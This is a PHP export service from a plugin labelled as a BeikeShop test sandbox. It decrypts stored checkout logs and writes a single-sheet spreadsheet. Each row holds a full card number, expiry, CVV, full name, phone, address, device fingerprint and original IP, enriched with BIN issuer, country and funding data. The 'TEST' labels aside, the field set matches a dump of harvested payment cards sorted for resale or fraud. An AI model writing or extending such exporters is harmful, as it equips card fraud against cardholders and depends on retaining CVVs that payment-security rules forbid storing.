<?php

namespace Plugin\BeikeShopTestSandbox\Services;

use Illuminate\Database\Query\Builder;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\DB;

class FullExportService
{
    /**
     * Final focused export contract:
     * - exactly one worksheet: "All Records"
     * - one order per row
     * - only card/identity/device-fingerprint/original-IP/full-BIN fields
     * - no C/D/P/G class columns and no project classification-authority columns
     */
    public const HEADERS = [
        'Card Brand',
        'Full TEST PAN',
        'Expiry',
        'CVV',
        'Full Name',
        'Phone',
        'Address',
        'Device Fingerprint HMAC',
        'Original IP',
        'BIN Prefix',
        'BIN Status',
        'BIN Source',
        'BIN Brand',
        'BIN Type',
        'BIN Category',
        'BIN Prepaid',
        'BIN Funding',
        'BIN Issuer',
        'BIN Issuer Phone',
        'BIN Issuer URL',
        'BIN Country',
        'BIN ISO2',
        'BIN ISO3',
        'BIN Luhn Valid',
        'BIN Length Valid',
        'BIN Masked PAN',
        'BIN Provider Cached',
        'BIN Endpoint',
        'BIN HTTP Status',
        'BIN Request ID',
        'BIN Brand Logo',
        'BIN Similar Bins JSON',
        'BIN Stale Reason',
        'BIN Error Code',
        'BIN Response Ms',
        'BIN Lookup At',
        'BIN LookedUp At',
        'BIN Response Hash',
        'BIN Raw JSON',
    ];

    public function build(
        string $scope,
        array $orderIds,
        array $filters,
        ?int $actorId
    ): array {
        $scope = strtolower($scope);

        if (! in_array($scope, ['selected', 'filtered', 'all'], true)) {
            throw new \InvalidArgumentException('Unsupported export scope.');
        }

        $ordersQuery = $this->ordersQuery($scope, $orderIds, $filters);

        if (! (clone $ordersQuery)->exists()) {
            throw new \RuntimeException('No orders matched the export selection.');
        }

        $writer     = new SimpleXlsxWriter;
        $orderCount = $writer->addSheet(
            'All Records',
            self::HEADERS,
            $this->orderRows($ordersQuery),
            // Full TEST PAN / expiry / CVV / identity / original IP are highlighted.
            [2, 3, 4, 5, 6, 7, 9],
            $this->widths()
        );

        $directory = storage_path('app/beikeshop-test-exports');
        if (! is_dir($directory) && ! mkdir($directory, 0700, true) && ! is_dir($directory)) {
            throw new \RuntimeException('Unable to create export directory.');
        }

        $filename = 'longos-test-card-bin-export-' . now()->format('Ymd-His') . '.xlsx';
        $path     = $directory . DIRECTORY_SEPARATOR . $filename;
        $writer->save($path);

        return [
            'path'      => $path,
            'filename'  => $filename,
            'orders'    => $orderCount,
            'scope'     => $scope,
            'worksheet' => 'All Records',
            'columns'   => count(self::HEADERS),
            'actorId'   => $actorId,
        ];
    }

    private function ordersQuery(string $scope, array $orderIds, array $filters): Builder
    {
        $query = DB::table('beikeshop_test_checkout_logs');

        if ($scope === 'selected') {
            $ids = array_values(array_unique(array_filter(
                array_map('strval', $orderIds),
                fn ($id) => (bool) preg_match('/^DEMO_[A-Z0-9]{12}$/', $id)
            )));

            if ($ids === []) {
                throw new \InvalidArgumentException('No valid selected order IDs were supplied.');
            }

            return $query->whereIn('order_id', $ids);
        }

        if ($scope === 'all') {
            return $query;
        }

        $search = trim((string) ($filters['search'] ?? ''));
        if ($search !== '') {
            $query->where(function (Builder $q) use ($search) {
                $like = '%' . str_replace(['%', '_'], ['\\%', '\\_'], $search) . '%';
                $q->where('order_id', 'like', $like)
                    ->orWhere('scenario', 'like', $like)
                    ->orWhere('card_brand', 'like', $like)
                    ->orWhere('card_type', 'like', $like)
                    ->orWhere('pan_last4', 'like', $like)
                    ->orWhere('bin_prefix', 'like', $like)
                    ->orWhere('client_ip', 'like', $like)
                    ->orWhere('status', 'like', $like);
            });
        }

        $status = trim((string) ($filters['status'] ?? ''));
        if ($status !== '') {
            $query->where('status', $status);
        }

        // C/D/P/G may still be used as an internal admin filter, but is not exported.
        $classCode = strtoupper(trim((string) ($filters['classCode'] ?? '')));
        if (in_array($classCode, ['C', 'D', 'P', 'G'], true)) {
            $query->where('effective_class_code', $classCode);
        }

        $risk = trim((string) ($filters['risk'] ?? ''));
        if ($risk === 'low') {
            $query->whereBetween('risk_score', [0, 29]);
        } elseif ($risk === 'medium') {
            $query->whereBetween('risk_score', [30, 59]);
        } elseif ($risk === 'high') {
            $query->where('risk_score', '>=', 60);
        }

        $binStatus = trim((string) ($filters['binStatus'] ?? ''));
        if ($binStatus !== '') {
            $query->where('bin_lookup_status', $binStatus);
        }

        $binPrefix = preg_replace('/\D+/', '', (string) ($filters['binPrefix'] ?? ''));
        if ($binPrefix !== '' && preg_match('/^\d{6,8}$/', $binPrefix)) {
            $query->where('bin_prefix', 'like', $binPrefix . '%');
        }

        if (! empty($filters['todayOnly'])) {
            $query->whereDate('created_at', today());
        }

        return $query;
    }

    private function orderRows(Builder $query): \Generator
    {
        foreach ($query->orderBy('id')->cursor() as $order) {
            $sensitive = $this->decryptSensitive($order->sensitive_payload);
            $bin       = $this->sanitizeBinForExport(
                $this->decodeJson($order->bin_lookup_data, [])
            );

            yield [
                $order->card_brand,
                $sensitive['cardNumber'] ?? null,
                $sensitive['expiryDate'] ?? null,
                $sensitive['cvv']        ?? null,
                $sensitive['fullName']   ?? null,
                $sensitive['phone']      ?? null,
                $sensitive['address']    ?? null,
                $order->device_fingerprint_hash,
                $order->client_ip,
                $order->bin_prefix,
                $order->bin_lookup_status,
                $order->bin_lookup_source,
                $bin['brand']    ?? null,
                $bin['type']     ?? null,
                $bin['category'] ?? null,
                array_key_exists('prepaid', $bin) ? $bin['prepaid'] : null,
                $bin['resolvedFunding'] ?? null,
                $bin['issuer']          ?? null,
                $bin['issuerPhone']     ?? null,
                $bin['issuerUrl']       ?? null,
                $bin['country']         ?? null,
                $bin['iso2']            ?? null,
                $bin['iso3']            ?? null,
                array_key_exists('luhnValid', $bin) ? $bin['luhnValid'] : null,
                array_key_exists('lengthValid', $bin) ? $bin['lengthValid'] : null,
                $order->bin_card_number_masked,
                array_key_exists('providerCached', $bin) ? $bin['providerCached'] : null,
                $bin['endpoint']   ?? null,
                $bin['httpStatus'] ?? null,
                $bin['requestId']  ?? null,
                $bin['brandLogo']  ?? null,
                json_encode($bin['similarBins'] ?? [], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES),
                $bin['staleReason'] ?? null,
                $bin['errorCode']   ?? null,
                $order->bin_response_ms,
                $order->bin_lookup_at,
                $bin['lookedUpAt'] ?? null,
                $order->bin_response_hash,
                json_encode($bin, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES),
            ];
        }
    }

    private function sanitizeBinForExport(array $bin): array
    {
        // The final export intentionally does not record C/D/P/G class codes.
        unset(
            $bin['resolvedClassCode'],
            $bin['classCode'],
            $bin['class_code']
        );

        return $bin;
    }

    private function decryptSensitive(?string $payload): array
    {
        if (! $payload) {
            return [];
        }

        try {
            $decoded = json_decode(Crypt::decryptString($payload), true);

            return is_array($decoded) ? $decoded : [];
        } catch (\Throwable) {
            return [];
        }
    }

    private function decodeJson(mixed $value, array $fallback = []): array
    {
        if (is_array($value)) {
            return $value;
        }

        if (! is_string($value) || trim($value) === '') {
            return $fallback;
        }

        $decoded = json_decode($value, true);

        return is_array($decoded) ? $decoded : $fallback;
    }

    private function widths(): array
    {
        return [
            1  => 16,  // Card Brand
            2  => 28,  // Full TEST PAN
            3  => 12,  // Expiry
            4  => 10,  // CVV
            5  => 22,  // Full Name
            6  => 20,  // Phone
            7  => 40,  // Address
            8  => 38,  // Device Fingerprint HMAC
            9  => 20,  // Original IP
            18 => 34, // BIN Issuer
            19 => 22, // BIN Issuer Phone
            20 => 36, // BIN Issuer URL
            31 => 34, // BIN Brand Logo
            32 => 44, // Similar BINs JSON
            39 => 70, // BIN Raw JSON
        ];
    }
}
